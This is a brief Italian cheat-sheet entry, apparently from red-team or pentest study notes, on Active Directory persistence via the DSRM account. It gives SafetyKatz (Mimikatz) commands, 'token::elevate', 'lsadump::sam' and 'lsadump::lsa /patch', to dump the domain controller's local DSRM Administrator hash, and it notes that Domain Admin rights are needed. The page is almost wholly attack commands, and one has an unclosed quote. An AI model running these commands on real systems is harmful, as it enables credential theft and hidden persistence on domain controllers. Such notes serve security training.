# Persistence - DSRM2

* Scarica la password DSRM (necessita privilegi DA)

```powershell
SafetyKatz.exe "token::elevate" "lsadump::sam"
```

* Compara l'hash Administrator con l'Administrator hash&#x20;

```powershell
SafetyKatz.exe "lsadump::lsa /patch
```

* Il primo e' il local Administrator DSRM
